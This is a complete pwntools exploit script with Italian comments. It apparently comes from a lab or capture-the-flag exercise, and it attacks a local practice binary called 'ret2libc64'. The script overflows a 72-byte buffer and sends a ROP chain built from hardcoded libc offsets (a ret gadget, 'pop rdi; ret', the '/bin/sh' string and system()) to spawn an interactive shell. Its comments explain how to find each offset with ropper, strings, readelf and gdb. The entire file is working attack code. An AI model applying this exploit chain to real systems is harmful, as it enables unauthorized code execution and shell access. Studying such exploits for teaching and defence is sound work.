from pwn import *


#pattern create e pattern search -> offset per raggiungere rsp 
buf = b'\x55'* 72


p = process("./ret2libc64")


# vmmap     per vedere la mappatura in gdb

#### PRENDERE IL PRIMO CHE C'Ã© CHE HA libc-2.31.so  in questo caso , con START
libc_base_addr = 0x00007ffff7dc4000




#lld per trovare il path di libc



#ropper --file /lib/x86_64-linux-gnu/libc.so.6   --search "ret;"
# posso anche cercarlo direttamente nel file con ropper --file ret2libc64 --search "ret;" >>>  0x4004e1, in questo caso dovrei usare direttamente questo nel payload come p64(0x4004e1)
ret_offset = 0xbe2f9

#ropper --file  /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi; ret;"
# posso anche cercarlo direttamente nel file con ropper --file ret2libc64 --search "pop rdi; ret;" >>>  0x400723, in questo caso dovrei usare direttamente questo nel payload come p64(0x4004e1)
pop_rdi_offset = 0x23b6a


#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep  "/bin/sh"
#nel file non e' caricata la /bin/sh quindi per forza dalla libc.so devo prenderlo
bin_sh_offset = 0x1b45bd


#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
#nel file non e' caricata la system quindi per forza dalla libc.so devo prenderlo
system_offset = 0x52290



##### CALCOLO GLI INDIRIZZI DELLE FUNZIONI
ret_address = p64(libc_base_addr+ret_offset)

pop_rdi_address = p64(libc_base_addr+pop_rdi_offset)

bin_sh_address = p64(libc_base_addr+bin_sh_offset)

system_address = p64(libc_base_addr+system_offset)

p.sendline(buf+ ret_address + pop_rdi_address+bin_sh_address+system_address)

p.interactive()